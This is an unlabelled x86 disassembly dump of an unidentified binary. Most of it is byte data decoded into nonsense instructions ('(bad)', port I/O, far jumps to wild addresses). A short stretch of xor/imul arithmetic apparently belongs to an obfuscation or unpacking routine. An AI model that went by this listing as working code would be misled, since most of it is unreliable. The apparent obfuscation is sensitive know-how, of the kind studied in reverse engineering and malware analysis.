  41a34b:	mov    ds:0xe983c201,al
  41a350:	idiv   dh
  41a352:	outs   dx,DWORD PTR ds:[esi]
  41a353:	dec    edx
  41a354:	and    bl,BYTE PTR [ecx]
  41a356:	xchg   edi,eax
  41a357:	fimul  DWORD PTR cs:[edi-0x41ee51e5]
  41a35e:	add    ebx,DWORD PTR [edi-0x2d0173a1]
  41a364:	aas    
  41a365:	sbb    ah,BYTE PTR [edx-0x66]
  41a368:	gs int 0x5
  41a36b:	jnp    0x41a328
  41a36d:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41a36f:	jg     0x41a33c
  41a371:	inc    edx
  41a372:	adc    esp,DWORD PTR [edx]
  41a374:	sub    dh,BYTE PTR [edi+ecx*8]
  41a377:	lods   eax,DWORD PTR ds:[esi]
  41a378:	cmp    ch,BYTE PTR [ecx-0x3c2b4e52]
  41a37e:	mov    ecx,0x54b3e808
  41a383:	xchg   esi,eax
  41a384:	adc    BYTE PTR [edx+0x6c4e914f],ch
  41a38a:	mov    edi,0x8b66a036
  41a38f:	push   ebx
  41a390:	xchg   edx,eax
  41a391:	ror    BYTE PTR [edx-0x76],0x93
  41a395:	sar    DWORD PTR [esp+ecx*2-0x298e2b7],0x6e
  41a39d:	es inc edi
  41a39f:	ror    ch,cl
  41a3a1:	icebp  
  41a3a2:	or     edx,DWORD PTR [ebp+0x6decadbd]
  41a3a8:	cmp    dl,ch
  41a3aa:	dec    ecx
  41a3ab:	clc    
  41a3ac:	pop    esp
  41a3ad:	fnstenv [eax]
  41a3af:	add    esi,edi
  41a3b1:	stos   BYTE PTR es:[edi],al
  41a3b2:	dec    edi
  41a3b3:	cmp    cl,BYTE PTR [edi-0x75e376e5]
  41a3b9:	pusha  
  41a3ba:	call   0x61371bbe
  41a3bf:	and    BYTE PTR ds:0x6b96c56d,ah
  41a3c5:	enter  0x14a9,0x31
  41a3c9:	or     al,0xd6
  41a3cb:	mov    al,ds:0xfd9894ab
  41a3d0:	mov    ds:0x5ba598af,eax
  41a3d5:	inc    edx
  41a3d6:	retf   
  41a3d7:	mov    eax,ds:0x5c132d7f
  41a3dc:	jbe    0x41a415
  41a3de:	or     BYTE PTR [edi],bl
  41a3e0:	sbb    dh,BYTE PTR [edx-0x1490ac18]
  41a3e6:	neg    DWORD PTR [esi-0x373fe91e]
  41a3ec:	lea    ebx,[ebx]
  41a3ee:	fld    TBYTE PTR [edx]
  41a3f0:	jbe    0x2bbe6681
  41a3f6:	jmp    0x41a3fc
  41a3f8:	stc    
  41a3f9:	pop    esp
  41a3fa:	leave  
  41a3fb:	jl     0x41a3b5
  41a3fd:	int3   
  41a3fe:	in     al,dx
  41a3ff:	xor    edx,ebx
  41a401:	sub    al,0xaa
  41a403:	lock cli 
  41a405:	rol    ecx,1
  41a407:	test   BYTE PTR [edi],0xa9
  41a40a:	jge    0x41a3e4
  41a40c:	out    0xb,al
  41a40e:	sub    al,0xe5
  41a410:	add    eax,0x4719dd3b
  41a415:	in     al,dx
  41a416:	popf   
  41a417:	fcmovnu st,st(1)
  41a419:	push   edx
  41a41a:	in     al,0x17
  41a41c:	mov    esi,0xa7082fe5
  41a421:	aam    0x42
  41a423:	mov    eax,0xe0d627c9
  41a428:	pop    ebp
  41a429:	push   ebp
  41a42a:	out    dx,al
  41a42b:	mov    ?,WORD PTR [ecx+eax*4-0x18]
  41a42f:	mov    eax,0x7a67a9b9
  41a434:	pop    ebp
  41a435:	mov    ebx,0xbbf816df
  41a43a:	jl     0x41a49e
  41a43c:	sbb    dl,bh
  41a43e:	dec    ecx
  41a43f:	dec    DWORD PTR [edi-0x27bbae48]
  41a445:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a446:	call   0xbfbc6233
  41a44b:	fcmovnb st,st(5)
  41a44d:	out    dx,al
  41a44e:	mov    esi,0x1b1e3dd9
  41a453:	xchg   edx,eax
  41a454:	jl     0x41a494
  41a456:	sbb    eax,0x81c5643
  41a45b:	test   BYTE PTR [esi],0x7e
  41a45e:	inc    esp
  41a45f:	mov    ecx,0x9a104dae
  41a464:	lods   eax,DWORD PTR ds:[esi]
  41a465:	dec    ecx
  41a466:	hlt    
  41a467:	pushf  
  41a468:	sar    DWORD PTR [esi+0x39df3da2],1
  41a46e:	adc    al,BYTE PTR [ebp+0x6009c935]
  41a474:	mov    WORD PTR [edi],?
  41a476:	mov    ds:0xe7c36550,al
  41a47b:	sub    al,0x9c
  41a47d:	popf   
  41a47e:	jae    0x41a410
  41a480:	jge    0x41a44b
  41a482:	arpl   WORD PTR [eax-0x3f],sp
  41a485:	push   ecx
  41a486:	cmp    bh,dl
  41a488:	pop    ds
  41a489:	leave  
  41a48a:	jg     0x41a47e
  41a48c:	fwait
  41a48d:	and    BYTE PTR [ebx+ecx*4+0x4e],ah
  41a491:	aad    0xc3
  41a493:	sbb    DWORD PTR [eax-0x70],ebx
  41a496:	scas   al,BYTE PTR es:[edi]
  41a497:	test   BYTE PTR [esi+0x5f],cl
  41a49a:	outs   dx,BYTE PTR ds:[esi]
  41a49b:	mov    eax,ds:0xd4a9f0c1
  41a4a0:	mov    fs,WORD PTR [edx-0x205c5c9a]
  41a4a6:	sahf   
  41a4a7:	mov    ebx,0xe08c10c2
  41a4ac:	add    ah,bl
  41a4ae:	mov    dh,0x5f
  41a4b0:	stos   BYTE PTR es:[edi],al
  41a4b1:	xchg   DWORD PTR [eax-0xa],edi
  41a4b4:	and    dh,BYTE PTR [esi+0x24]
  41a4b7:	outs   dx,DWORD PTR ds:[esi]
  41a4b8:	mov    edi,0xa4d50c73
  41a4bd:	sbb    al,BYTE PTR [eax]
  41a4bf:	jle    0x41a534
  41a4c1:	adc    al,0x12
  41a4c3:	lods   al,BYTE PTR ds:[esi]
  41a4c4:	mov    edi,0x994da850
  41a4c9:	xor    ecx,DWORD PTR [edx+0x8]
  41a4cc:	sti    
  41a4cd:	adc    ecx,DWORD PTR [ecx-0xda5e512]
  41a4d3:	xchg   ebp,eax
  41a4d4:	mov    bl,BYTE PTR [eax+0x149bb820]
  41a4da:	popf   
  41a4db:	jle    0x41a49c
  41a4dd:	(bad)  
  41a4de:	ss test al,0x75
  41a4e1:	jmp    0x9c661820
  41a4e6:	pop    eax
  41a4e7:	push   es
  41a4e8:	addr16 cmc 
  41a4ea:	or     eax,0x349829d7
  41a4ef:	int    0x4d
  41a4f1:	outs   dx,BYTE PTR ds:[esi]
  41a4f2:	mov    ah,0x7e
  41a4f4:	fidivr WORD PTR [ebx-0x3e]
  41a4f7:	lahf   
  41a4f8:	(bad)  
  41a4fa:	add    BYTE PTR [edx-0x5050eb03],ah
  41a500:	push   edi
  41a501:	fmul   DWORD PTR [ebp-0x48ad42c4]
  41a507:	dec    edi
  41a508:	jecxz  0x41a55f
  41a50a:	nop
  41a50b:	ss xchg esi,eax
  41a50d:	les    esi,FWORD PTR [edx+0x14d29834]
  41a513:	inc    ebp
  41a514:	(bad)  
  41a515:	jmp    0x7cdb6a14
  41a51a:	jecxz  0x41a550
  41a51c:	add    ah,bl
  41a51e:	popa   
  41a51f:	sbb    eax,DWORD PTR [edx-0x80]
  41a522:	pop    edx
  41a523:	mov    DWORD PTR [ebp+0x43397e1c],0xdcfdb2fa
  41a52d:	imul   ebx,ecx,0x6d
  41a530:	test   eax,0x490003b8
  41a535:	dec    DWORD PTR [edi-0x6f9a243e]
  41a53b:	add    DWORD PTR [ecx+0x49],edx
  41a53e:	mov    ecx,0xb86aadab
  41a543:	jae    0x41a535
  41a545:	pop    ss
  41a546:	add    eax,0x817f4228
  41a54b:	adc    bh,BYTE PTR [ebx+0x31f4452a]
  41a551:	inc    ebp
  41a552:	and    cl,BYTE PTR [esi+0x2]
  41a555:	jne    0x41a4e4
  41a557:	popa   
  41a558:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a559:	sbb    bh,BYTE PTR ds:0x78a66fdb
  41a55f:	sub    al,0x44
  41a561:	leave  
  41a562:	ficomp WORD PTR [ebx]
  41a564:	xchg   ecx,eax
  41a565:	jne    0x41a58f
  41a567:	push   0x28deb2f0
  41a56c:	mov    ebp,0x8d363ce7
  41a571:	sub    BYTE PTR [ebp-0x45],cl
  41a574:	pop    edx
  41a575:	mov    ah,0xa1
  41a577:	push   ebp
  41a578:	push   ss
  41a579:	call   0x1926195c
  41a57e:	and    BYTE PTR [ecx],dh
  41a580:	pop    ecx
  41a581:	retf   0x8d55
  41a584:	imul   esp,DWORD PTR [edi+eiz*2],0x743fdda7
  41a58b:	sbb    al,0x3
  41a58d:	pop    ecx
  41a58e:	out    dx,al
  41a58f:	jmp    0xe7c6735c
  41a594:	jmp    0x58969d5a
  41a599:	inc    edi
  41a59a:	and    bl,BYTE PTR [edx-0x64]
  41a59d:	repz repnz std 
  41a5a0:	cmp    esp,edx
  41a5a2:	adc    al,dh
  41a5a4:	jl     0x41a60a
  41a5a6:	mov    bh,0x5e
  41a5a8:	pushf  
  41a5a9:	scas   al,BYTE PTR es:[edi]
  41a5aa:	ins    BYTE PTR es:[edi],dx
  41a5ab:	fiadd  WORD PTR [edx+eax*8-0x65b7ad08]
  41a5b2:	enter  0x2442,0x7b
  41a5b6:	jecxz  0x41a5e9
  41a5b8:	sub    bh,BYTE PTR [ebx]
  41a5ba:	add    esp,eax
  41a5bc:	jae    0x41a5d9
  41a5be:	push   edx
  41a5bf:	aas    
  41a5c0:	or     DWORD PTR [ebx-0x554b126a],edx
  41a5c6:	je     0x41a627
  41a5c8:	std    
  41a5c9:	enter  0x7eb7,0x80
  41a5cd:	mov    bl,0xbc
  41a5cf:	push   ecx
  41a5d0:	in     eax,0xc1
  41a5d2:	pop    edx
  41a5d3:	int    0x67
  41a5d5:	stos   DWORD PTR es:[edi],eax
  41a5d6:	ret    0x82a6
  41a5d9:	mov    edi,0xfe748a67
  41a5de:	popa   
  41a5df:	pop    ebx
  41a5e0:	bound  edi,QWORD PTR [esi]
  41a5e2:	sbb    esp,DWORD PTR [ecx]
  41a5e4:	ret    0x4dc0
  41a5e7:	aas    
  41a5e8:	cmp    al,0xa6
  41a5ea:	sub    al,0x1a
  41a5ec:	mov    dl,0x6e
  41a5ee:	xchg   esi,eax
  41a5ef:	in     eax,0x28
  41a5f1:	fsub   DWORD PTR [edi+0x1250d7fc]
  41a5f7:	pop    edx
  41a5f8:	mov    al,ds:0x8229740f
  41a5fd:	mov    eax,ds:0xe59bf256
  41a602:	mov    dh,0x87
  41a604:	inc    ebp
  41a605:	dec    edx
  41a606:	jle    0x41a626
  41a608:	pusha  
  41a609:	inc    esi
  41a60a:	es scas eax,DWORD PTR es:[edi]
  41a60c:	dec    esp
  41a60d:	clc    
  41a60e:	or     DWORD PTR [ebx+0x60b9b173],ebx
  41a614:	cmp    al,0x11
  41a616:	mov    dl,0x63
  41a618:	inc    esp
  41a619:	adc    bl,BYTE PTR [ecx-0x20ef4558]
  41a61f:	cli    
  41a620:	adc    eax,DWORD PTR [ebx+0x63]
  41a623:	jno    0x41a60b
  41a625:	pop    ss
  41a626:	and    eax,0xaeda15e2
  41a62b:	sub    ecx,DWORD PTR [edx]
  41a62d:	fstp   TBYTE PTR [ebx+0x78ec42d9]
  41a633:	or     dl,BYTE PTR [ecx+edi*1-0xd]
  41a637:	jo     0x41a5e5
  41a639:	add    edx,DWORD PTR [ebp+edi*4+0x17]
  41a63d:	xor    ecx,DWORD PTR [esp+esi*1+0x69]
  41a641:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a642:	lahf   
  41a643:	mov    ebx,0x325753df
  41a648:	not    BYTE PTR [ebp+0x2b4504cd]
  41a64e:	cmp    al,0xa9
  41a650:	push   es
  41a651:	or     al,0x6c
  41a653:	push   ebp
  41a654:	mov    ebp,0x64d8945a
  41a659:	sti    
  41a65a:	ins    DWORD PTR es:[edi],dx
  41a65b:	jle    0x41a637
  41a65d:	cwde   
  41a65e:	aad    0xdd
  41a660:	mov    edi,0x7e54a638
  41a665:	out    dx,al
  41a666:	pop    ss
  41a667:	mov    dl,bh
  41a669:	pop    esp
  41a66a:	lods   eax,DWORD PTR ds:[esi]
  41a66b:	jecxz  0x41a6b6
  41a66d:	and    dl,dl
  41a66f:	xchg   ebp,eax
  41a670:	jg     0x41a66f
  41a672:	mov    ecx,0x4656a89d
  41a677:	add    al,0xcc
  41a679:	mov    edx,0x4c918e7d
  41a67e:	arpl   di,ax
  41a680:	cli    
  41a681:	mov    edi,0xbe4b3c2b
  41a686:	jmp    0x41a65b
  41a688:	cmp    eax,0x52a4c4b8
  41a68d:	add    ebx,esi
  41a68f:	jmp    0x41a6ec
  41a691:	pop    ecx
  41a692:	push   ss
  41a693:	dec    ebx
  41a694:	test   ch,dh
  41a696:	mov    al,0x76
  41a698:	inc    ecx
  41a699:	sbb    BYTE PTR [eax],0x22
  41a69c:	inc    ecx
  41a69d:	jl     0x41a6d1
  41a69f:	loopne 0x41a640
  41a6a1:	mov    DWORD PTR [edi+0x61],0xf60b754
  41a6a8:	jbe    0x41a6da
  41a6aa:	pop    ebx
  41a6ab:	jg     0x41a70d
  41a6ad:	lods   al,BYTE PTR ds:[esi]
  41a6ae:	dec    eax
  41a6af:	pop    esp
  41a6b0:	dec    edi
  41a6b1:	push   ebp
  41a6b2:	mov    bl,0x29
  41a6b4:	or     edx,DWORD PTR [ebp+0xb077cc5]
  41a6ba:	cmp    eax,0xcc5b24f7
  41a6bf:	jmp    0x41a71e
  41a6c1:	hlt    
  41a6c2:	cmc    
  41a6c3:	hlt    
  41a6c4:	dec    ebp
  41a6c5:	sbb    al,0xbf
  41a6c7:	es xchg ecx,eax
  41a6c9:	push   edx
  41a6ca:	repz fcmovne st,st(0)
  41a6cd:	fmul   st(4),st
  41a6cf:	jge    0x41a6e2
  41a6d1:	push   edx
  41a6d2:	mov    ecx,0x658d150b
  41a6d7:	inc    ecx
  41a6d8:	push   0x9056f18d
  41a6dd:	aas    
  41a6de:	loopne 0x41a73a
  41a6e0:	das    
  41a6e1:	xchg   ebp,eax
  41a6e2:	cmc    
  41a6e3:	ret    
  41a6e4:	test   DWORD PTR [edi+eiz*1+0x235492ad],0x5563411f
  41a6ef:	cmp    eax,0xa4be217c
  41a6f4:	pop    edi
  41a6f5:	cmp    ebx,DWORD PTR [ebx+eiz*4-0x419f37e]
  41a6fc:	pop    edi
  41a6fd:	out    0xe5,al
  41a6ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a700:	add    eax,DWORD PTR [edx+0x7d08d48e]
  41a706:	dec    ecx
  41a707:	lds    edi,FWORD PTR [edx+0x29c48ab]
  41a70d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a70e:	jo     0x41a71e
  41a710:	push   ebx
  41a711:	xchg   ecx,eax
  41a712:	mov    esi,0x65b87707
  41a717:	cwde   
  41a718:	test   DWORD PTR [edx],0x5a41e140
  41a71e:	jbe    0x41a759
  41a720:	push   ecx
  41a721:	arpl   WORD PTR [eax],sp
  41a723:	inc    esp
  41a724:	mov    al,0xd5
  41a726:	push   ebp
  41a727:	or     BYTE PTR [edi],0xbc
  41a72a:	pop    eax
  41a72b:	dec    ecx
  41a72c:	cs pop ss
  41a72e:	aas    
  41a72f:	adc    al,BYTE PTR [ecx-0x7723886e]
  41a735:	sar    DWORD PTR ds:0xabaa9e9b,cl
  41a73b:	sbb    al,0x76
  41a73d:	dec    edx
  41a73e:	add    BYTE PTR [ebp-0x2cd4546c],bh
  41a744:	lahf   
  41a745:	inc    edi
  41a746:	and    al,0xf9
  41a748:	call   FWORD PTR [ebp+0x2b]
  41a74b:	jge    0x41a76e
  41a74d:	loopne 0x41a7a7
  41a74f:	sub    eax,0xf58a9878
  41a754:	out    0x87,eax
  41a756:	inc    BYTE PTR [edx-0x4b0bd88c]
  41a75c:	cmp    al,0x6b
  41a75e:	cmp    ah,BYTE PTR [ebx]
  41a760:	test   al,dh
  41a762:	mov    ebx,0xd91618f5
  41a767:	les    esp,FWORD PTR [ebx+0x18305808]
  41a76d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a76e:	icebp  
  41a76f:	jmp    0x41a77b
  41a771:	cmp    al,0x5
  41a773:	xchg   esp,eax
  41a774:	outs   dx,BYTE PTR ds:[esi]
  41a775:	cdq    
  41a776:	and    edi,DWORD PTR [edx+0x42]
  41a779:	inc    ecx
  41a77a:	dec    eax
  41a77b:	dec    ebx
  41a77c:	push   ebp
  41a77d:	push   esp
  41a77e:	lahf   
  41a77f:	dec    edx
  41a780:	in     eax,0xe5
  41a782:	pop    esi
  41a783:	retf   0xb8cb
  41a786:	pop    esp
  41a787:	(bad)  
  41a788:	out    dx,al
  41a789:	and    eax,0x58f12a8a
  41a78e:	dec    edi
  41a78f:	imul   eax,DWORD PTR [edi+0x3c61ce0],0x77f4051a
  41a799:	pop    esi
  41a79a:	jns    0x41a7b8
  41a79c:	mov    dh,0xd4
  41a79e:	adc    al,0x21
  41a7a0:	push   0xffffffa9
  41a7a2:	dec    eax
  41a7a3:	pushf  
  41a7a4:	icebp  
  41a7a5:	sub    BYTE PTR [eax-0xd03611e],ch
  41a7ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a7ac:	clc    
  41a7ad:	gs aaa 
  41a7af:	adc    bh,BYTE PTR [eax]
  41a7b1:	cmp    bh,0x8e
  41a7b4:	ret    0x306e
  41a7b7:	xor    eax,0x7ecd4570
  41a7bc:	adc    ah,BYTE PTR [edx+eiz*4+0x10ed1e2]
  41a7c3:	mov    edx,DWORD PTR [ebp-0x14]
  41a7c6:	mov    DWORD PTR [ebp+0x8],edx
  41a7c9:	jmp    0x41cb87
  41a7ce:	mov    edx,DWORD PTR [ebp+0x8]
  41a7d1:	mov    ebx,DWORD PTR [ebp-0x8]
  41a7d4:	xor    edx,eax
  41a7d6:	xor    ebx,eax
  41a7d8:	sub    edx,ebx
  41a7da:	sub    edx,esi
  41a7dc:	xor    edx,eax
  41a7de:	mov    DWORD PTR [ebp+0x8],edx
  41a7e1:	mov    edx,DWORD PTR [ebp+0x8]
  41a7e4:	mov    ebx,DWORD PTR [ebp-0x58]
  41a7e7:	add    edx,0x5708c4
  41a7ed:	imul   edx,ebx
  41a7f0:	mov    DWORD PTR [ebp-0x58],edx
  41a7f3:	mov    edx,DWORD PTR [ebp+0x8]
  41a7f6:	mov    ebx,DWORD PTR [ebp-0x54]
  41a7f9:	add    edx,0x64f8da
  41a7ff:	or     edx,ebx
  41a801:	mov    DWORD PTR [ebp-0x54],edx
  41a804:	mov    edx,DWORD PTR [ebp+0x8]
  41a807:	mov    ebx,DWORD PTR [ebp-0x50]
  41a80a:	add    edx,ecx
  41a80c:	xor    edx,ebx
  41a80e:	mov    DWORD PTR [ebp-0x50],edx
  41a811:	mov    edx,DWORD PTR [ebp+0x8]
  41a814:	mov    ebx,DWORD PTR [ebp-0x4c]
  41a817:	add    edx,edi
  41a819:	jmp    0x41cb62
  41a81e:	retf   
  41a81f:	lock xacquire sub DWORD PTR [ebx+0x2b],esi
  41a824:	mov    bl,0x72
  41a826:	cmp    bl,BYTE PTR [ebp+ebx*2-0x509c1d2]
  41a82d:	push   0xffffff90
  41a82f:	adc    edi,DWORD PTR [ebp+0x7c]
  41a832:	inc    eax
  41a833:	pop    edi
  41a834:	jl     0x41a8b2
  41a836:	dec    ebp
  41a837:	out    dx,al
  41a838:	jae    0x41a8a7
  41a83a:	xchg   BYTE PTR [esi],bh
  41a83c:	push   ds
  41a83d:	mov    bh,0xe0
  41a83f:	(bad)  [ecx+0x1f]
  41a842:	sbb    BYTE PTR [ebx-0x50],ah
  41a845:	lea    eax,[edx-0x5433a753]
  41a84b:	cld    
  41a84c:	ja     0x41a7cf
  41a84e:	mov    ebx,0xe9e6c1
  41a853:	dec    esi
  41a854:	ja     0x41a80d
  41a856:	addr16 dec ebp
  41a858:	mov    eax,0x9741193f
  41a85d:	(bad)  
  41a85e:	fsub   QWORD PTR [edx+0x69]
  41a861:	clc    
  41a862:	sbb    dl,BYTE PTR [ebp+0x4c835235]
  41a868:	adc    eax,DWORD PTR [ebp-0x522ff860]
  41a86e:	cld    
  41a86f:	sbb    DWORD PTR [eax],esp
  41a871:	out    0x2a,eax
  41a873:	jne    0x41a845
  41a875:	pop    ebx
  41a876:	ret    0xda9e
  41a879:	daa    
  41a87a:	inc    edx
  41a87b:	xchg   DWORD PTR [edx+0x18],esp
  41a87e:	xor    BYTE PTR fs:[ebx],dl
  41a881:	cmp    esp,DWORD PTR [ecx]
  41a883:	repnz dec esi
  41a886:	inc    ecx
  41a887:	inc    esi
  41a888:	fiadd  WORD PTR [ebp+edx*4-0x5bf1184]
  41a88f:	adc    ebx,edi
  41a891:	dec    edi
  41a892:	popa   
  41a893:	sbb    esp,DWORD PTR [ecx-0x13]
  41a896:	ss push esp
  41a898:	cwde   
  41a899:	push   esi
  41a89a:	leave  
  41a89b:	jge    0x41a8bd
  41a89d:	ins    DWORD PTR es:[edi],dx
  41a89e:	int3   
  41a89f:	scas   al,BYTE PTR es:[edi]
  41a8a0:	sbb    esi,DWORD PTR [edi-0x77]
  41a8a3:	or     ah,BYTE PTR [ebx]
  41a8a5:	cmp    eax,0x62f96f76
  41a8aa:	xchg   DWORD PTR [ebx+0x6bf55233],ecx
  41a8b0:	(bad)  
  41a8b1:	mov    al,ds:0xed5b47dd
  41a8b6:	popf   
  41a8b7:	popa   
  41a8b8:	or     ah,BYTE PTR [ebx+0x19]
  41a8bb:	retf   0x446f
  41a8be:	(bad)  
  41a8bf:	shl    BYTE PTR [esi-0x57],1
  41a8c2:	test   al,0xe0
  41a8c4:	daa    
  41a8c5:	out    0xf2,al
  41a8c7:	or     eax,0x99228527
  41a8cc:	push   ebp
  41a8cd:	dec    edi
  41a8ce:	sub    BYTE PTR [ecx-0x44a07aa3],al
  41a8d4:	pop    ebx
  41a8d5:	out    0xe9,eax
  41a8d7:	fist   WORD PTR [esi-0x2254505]
  41a8dd:	repz jae 0x41a8c6
  41a8e0:	sub    eax,0x89c1ccad
  41a8e5:	add    BYTE PTR [ecx+ecx*2+0x76],bl
  41a8e9:	push   eax
  41a8ea:	arpl   WORD PTR [esi+0x5f9fda6e],si
  41a8f0:	xor    cl,0xd1
  41a8f3:	xlat   BYTE PTR ds:[ebx]
  41a8f4:	(bad)  
  41a8f6:	pop    ebp
  41a8f7:	sbb    dh,dl
  41a8f9:	xchg   esi,eax
  41a8fa:	mov    bh,0x44
  41a8fc:	push   esi
  41a8fd:	or     eax,DWORD PTR [edi+ebp*2]
  41a900:	jbe    0x41a8a6
  41a902:	mov    ss,WORD PTR [eax]
  41a904:	repnz pushf 
  41a906:	xor    eax,0xf00e5d7d
  41a90b:	aad    0x5d
  41a90d:	jl     0x41a90d
  41a90f:	cli    
  41a910:	enter  0x2896,0x68
  41a914:	(bad)  
  41a915:	or     al,0xe2
  41a917:	or     DWORD PTR [ebx],edi
  41a919:	or     esi,edx
  41a91b:	cmp    al,0xd8
  41a91d:	jo     0x41a965
  41a91f:	mov    ecx,0x5054535e
  41a924:	(bad)  
  41a925:	adc    ecx,ebp
  41a927:	jge    0x41a97d
  41a929:	dec    ebx
  41a92a:	sahf   
  41a92b:	xchg   ebx,eax
  41a92c:	cmp    ecx,ebp
  41a92e:	(bad)  
  41a92f:	out    dx,al
  41a930:	pop    ebx
  41a931:	jl     0x41a8c9
  41a933:	sar    DWORD PTR ds:0x98000cc6,cl
  41a939:	adc    DWORD PTR [ebp-0x22e4cac4],0x53
  41a940:	ins    BYTE PTR es:[edi],dx
  41a941:	neg    DWORD PTR [ebp+ecx*4+0x2b8f0a07]
  41a948:	xchg   esp,eax
  41a949:	fidivr WORD PTR [esi+0x60]
  41a94c:	iret   
  41a94d:	xchg   ebx,eax
  41a94e:	cmp    BYTE PTR [edx-0x42],bh
  41a951:	pop    ds
  41a952:	ss int 0xa1
  41a955:	out    0x3e,al
  41a957:	(bad)
  41a95c:	test   DWORD PTR ds:0x41e4121a,0xd30ba43f
  41a966:	arpl   bp,sp
  41a968:	aad    0xd6
  41a96a:	ror    DWORD PTR [eax-0x120b565e],cl
  41a970:	sbb    esp,DWORD PTR [ebx]
  41a972:	xor    DWORD PTR [esi+ebp*4-0x16],0xb9629001
  41a97a:	push   eax
  41a97b:	xchg   ecx,eax
  41a97c:	adc    DWORD PTR [ebp-0x70e2e51e],0x11
  41a983:	(bad)  
  41a984:	jl     0x41a9fc
  41a986:	jle    0x41a9b0
  41a988:	add    dh,dh
  41a98a:	cmp    BYTE PTR [ecx],bl
  41a98c:	add    edi,DWORD PTR [edi+0x2d13b0e3]
  41a992:	inc    ebp
  41a993:	and    esp,DWORD PTR [ecx-0x9]
  41a996:	shl    DWORD PTR [edx-0x47],1
  41a999:	sub    bl,BYTE PTR [ecx-0x17]
  41a99c:	add    BYTE PTR [ebp-0x4ce10b77],dh
  41a9a2:	xchg   ebx,eax
  41a9a3:	mov    ah,0x8b
  41a9a5:	jecxz  0x41aa00
  41a9a7:	ret    
  41a9a8:	mov    bl,0xab
  41a9aa:	je     0x41aa08
  41a9ac:	mov    al,ds:0x9017dfce
  41a9b1:	push   eax
  41a9b2:	sbb    bh,bl
  41a9b4:	sub    DWORD PTR [eax],eax
  41a9b6:	bound  edi,QWORD PTR [edi+0x18]
  41a9b9:	mov    ?,dx
  41a9bc:	or     al,0x39
  41a9be:	jne    0x41a99b
  41a9c0:	dec    ebp
  41a9c1:	in     eax,0x8e
  41a9c3:	aas    
  41a9c4:	mov    ch,0x27
  41a9c6:	cld    
  41a9c7:	mov    esi,DWORD PTR [edx]
  41a9c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9ca:	shl    ah,0x5a
  41a9cd:	leave  
  41a9ce:	add    ah,bh
  41a9d0:	mov    ah,0x3c
  41a9d2:	stos   DWORD PTR es:[edi],eax
  41a9d3:	inc    eax
  41a9d4:	jmp    0x7f57:0xbea1eaa7
  41a9db:	dec    eax
  41a9dc:	inc    esi
  41a9dd:	ds out 0x76,eax
  41a9e0:	or     eax,0x69d3a630
  41a9e5:	es aas 
  41a9e7:	enter  0x49cc,0xd8
  41a9eb:	inc    esp
  41a9ec:	and    bh,BYTE PTR [ebx]
  41a9ee:	mov    dh,0xd3
  41a9f0:	mov    eax,ds:0x46ebfc55
  41a9f5:	fst    QWORD PTR [edi+eax*2+0xa]
  41a9f9:	add    DWORD PTR [edx],ecx
  41a9fb:	popf   
  41a9fc:	jl     0x41a9e0
  41a9fe:	mov    esi,0xa6ca3a87
  41aa03:	fidiv  DWORD PTR [esi-0x30]
  41aa06:	(bad)  
  41aa08:	mov    esp,0x9b2cbf02
  41aa0d:	or     eax,0xacf8fb6f
  41aa12:	or     bl,ch
  41aa14:	sbb    al,0x9f
  41aa16:	dec    edi
  41aa17:	mov    al,ds:0x6f12817b
  41aa1c:	inc    esp
  41aa1d:	mov    bl,0x9a
  41aa1f:	xchg   esp,eax
  41aa20:	pushf  
  41aa21:	inc    esp
  41aa22:	xchg   edi,eax
  41aa23:	jecxz  0x41a9b3
  41aa25:	sti    
  41aa26:	pop    ss
  41aa27:	pop    ds
  41aa28:	sti    
  41aa29:	inc    ebp
  41aa2a:	shr    BYTE PTR [ecx],cl
  41aa2c:	and    eax,0xe1952fc4
  41aa31:	pop    edx
  41aa32:	(bad)  
  41aa33:	in     eax,0xb5
  41aa35:	das    
  41aa36:	retf   0x40
  41aa39:	jecxz  0x41aa86
  41aa3b:	sbb    DWORD PTR [esi],edi
  41aa3d:	(bad)  
  41aa3e:	push   esi
  41aa3f:	lahf   
  41aa40:	or     DWORD PTR [edi],edi
  41aa42:	mov    ebp,0x2cf5f1c5
  41aa47:	sbb    BYTE PTR [ecx+0x46091f30],dh
  41aa4d:	cmp    edi,eax
  41aa4f:	sbb    eax,DWORD PTR [eax]
  41aa51:	mov    bh,0xdc
  41aa53:	call   DWORD PTR [edi-0x6a]
  41aa56:	jl     0x41aa0b
  41aa58:	fsubrp st(2),st
  41aa5a:	in     eax,dx
  41aa5b:	fxtract 
  41aa5d:	push   cs
  41aa5e:	ret    
  41aa5f:	xor    edi,edi
  41aa61:	jp     0x41aa95
  41aa63:	push   cs
  41aa64:	es xor edx,edi
  41aa67:	jl     0x41aa5c
  41aa69:	sub    esp,DWORD PTR [ebp-0x1ea91e86]
  41aa6f:	dec    ebx
  41aa70:	pop    edx
  41aa71:	lods   al,BYTE PTR ds:[esi]
  41aa72:	push   cs
  41aa73:	(bad)  
  41aa74:	std    
  41aa75:	dec    edi
  41aa76:	scas   eax,DWORD PTR es:[edi]
  41aa77:	xor    eax,DWORD PTR [esi]
  41aa79:	data16 daa 
  41aa7b:	sbb    bl,BYTE PTR [ecx+0x72ee5805]
  41aa81:	adc    dl,BYTE PTR [ecx-0x3a]
  41aa84:	fwait
  41aa85:	push   esi
  41aa86:	xchg   ebp,eax
  41aa87:	dec    ecx
  41aa88:	dec    esi
  41aa89:	mov    al,ds:0x1e9eaac3
  41aa8e:	popa   
  41aa8f:	dec    eax
  41aa90:	cmp    ecx,DWORD PTR ds:0xb7512025
  41aa96:	addr16 add eax,0xfa3cd1c1
  41aa9c:	sub    al,0x92
  41aa9f:	aad    0x7d
  41aaa1:	pop    ss
  41aaa2:	repnz xor al,0xfc
  41aaa5:	enter  0x356d,0x16
  41aaa9:	mov    ecx,0x5048e153
  41aaae:	jo     0x41aa65
  41aab0:	mov    edx,0xb929a641
  41aab5:	pop    eax
  41aab6:	and    DWORD PTR [ebx+0x2e2b4fec],ebp
  41aabc:	push   0xffffff97
  41aabe:	cmc    
  41aabf:	pushf  
  41aac0:	lods   eax,DWORD PTR ds:[esi]
  41aac1:	loop   0x41aa81
